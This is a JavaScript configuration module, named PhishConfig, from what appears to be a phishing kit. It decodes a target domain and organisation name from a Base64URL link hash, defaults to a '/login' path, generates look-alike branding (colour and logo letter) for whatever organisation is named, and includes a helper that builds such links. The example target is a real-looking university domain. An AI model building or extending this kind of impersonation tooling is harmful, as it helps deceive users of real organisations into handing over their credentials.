/* ============================================================
   config.js — URL decoding & target-site configuration
   ============================================================
   URL format:  https://nagusamecs.github.io/phish/#<base64url>
   The hash is a Base64URL-encoded JSON payload:
     { "d": "asf.edu.mx", "n": "ASF Portal" }
   Minimal form (just domain):
     base64url("asf.edu.mx")
   ============================================================ */

const PhishConfig = (() => {

  /* ---------- Base64-URL helpers ---------- */
  function b64urlEncode(str) {
    return btoa(unescape(encodeURIComponent(str)))
      .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  }

  function b64urlDecode(b64) {
    let s = b64.replace(/-/g, '+').replace(/_/g, '/');
    while (s.length % 4) s += '=';
    try {
      return decodeURIComponent(escape(atob(s)));
    } catch {
      return null;
    }
  }

  /* ---------- Strip protocol & extract path from a URL-like string ---------- */
  function cleanDomain(raw) {
    let str = raw.trim();
    // Strip protocol (http:// https:// or //)
    str = str.replace(/^https?:\/\//i, '').replace(/^\/\//, '');
    // Split on first '/' to separate domain from path
    const slashIdx = str.indexOf('/');
    if (slashIdx > 0) {
      return { domain: str.slice(0, slashIdx), path: str.slice(slashIdx) };
    }
    // Strip trailing slash
    str = str.replace(/\/+$/, '');
    return { domain: str, path: null };
  }

  /* ---------- Parse hash ---------- */
  function parseHash() {
    const raw = location.hash.slice(1); // strip leading '#'
    if (!raw) return null;

    const decoded = b64urlDecode(raw);
    if (!decoded) return null;

    // Try JSON first
    try {
      const obj = JSON.parse(decoded);
      const cleaned = cleanDomain(obj.d || obj.domain || 'example.com');
      return {
        domain:  cleaned.domain,
        orgName: obj.n || obj.name || null,
        path:    obj.p || obj.path || cleaned.path || '/login',
      };
    } catch {
      // Plain string — treat as domain (possibly with protocol/path)
      const cleaned = cleanDomain(decoded);
      return {
        domain:  cleaned.domain,
        orgName: null,
        path:    cleaned.path || '/login',
      };
    }
  }

  /* ---------- Derive branding from domain ---------- */
  function deriveBranding(cfg) {
    const d = cfg.domain.toLowerCase();
    const parts = d.split('.');
    const stem  = parts.length >= 2 ? parts[parts.length - 2] : parts[0];

    // Friendly name fallback
    if (!cfg.orgName) {
      cfg.orgName = stem.charAt(0).toUpperCase() + stem.slice(1);
    }

    // Generate a deterministic brand colour from the domain string
    let hash = 0;
    for (let i = 0; i < d.length; i++) hash = d.charCodeAt(i) + ((hash << 5) - hash);
    const hue = Math.abs(hash) % 360;
    cfg.brandColor = `hsl(${hue}, 55%, 48%)`;

    // Placeholder logo (first letter)
    cfg.logoLetter = cfg.orgName.charAt(0).toUpperCase();

    return cfg;
  }

  /* ---------- Public ---------- */
  function get() {
    const cfg = parseHash();
    if (!cfg) return null;
    return deriveBranding(cfg);
  }

  /* Convenience: generate a hash for a given domain (for link creation) */
  function generateHash(domain, orgName, path) {
    // Sanitise domain input — strip protocol, extract path if embedded
    const cleaned = cleanDomain(domain);
    const d = cleaned.domain;
    const p = path || cleaned.path || undefined;

    if (orgName || p) {
      const obj = { d };
      if (orgName) obj.n = orgName;
      if (p)       obj.p = p;
      return b64urlEncode(JSON.stringify(obj));
    }
    return b64urlEncode(d);
  }

  return { get, generateHash, b64urlEncode, b64urlDecode, cleanDomain };
})();
